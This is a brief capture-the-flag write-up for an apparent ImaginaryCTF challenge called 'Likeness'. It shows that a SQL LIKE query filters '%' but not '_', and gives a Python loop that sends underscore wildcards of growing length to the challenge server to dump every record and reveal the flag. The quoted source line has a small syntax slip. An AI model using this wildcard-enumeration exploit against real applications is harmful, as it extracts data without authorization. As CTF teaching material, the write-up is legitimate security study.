### Likeness-03-07-2023
Looking at the source, we can see the SQL query string on line 24. On this line we can see that it sanitizes the "%" character, and uses parameterized statements:

```python
res = cur.execute("SELECT * from authors where last LIKE ?" (request.args['lastname'].replace("%", ""),))
```
 In parameterized statements, "_" can be used for any single character and "%" can be zero or more of any characters. We can use a simple python script to try every possible length of last name, exposing the entire database:

 ```python
import requests
import time

url = "http://puzzler7.imaginaryctf.org:11000/"

for i in range(100):
    r = requests.get(url, params = {"lastname" : i * "_"})
    print(f"====================")
    print(f"{i}: {r.text}")
    time.sleep(0.2)
 ```

This reveals the flag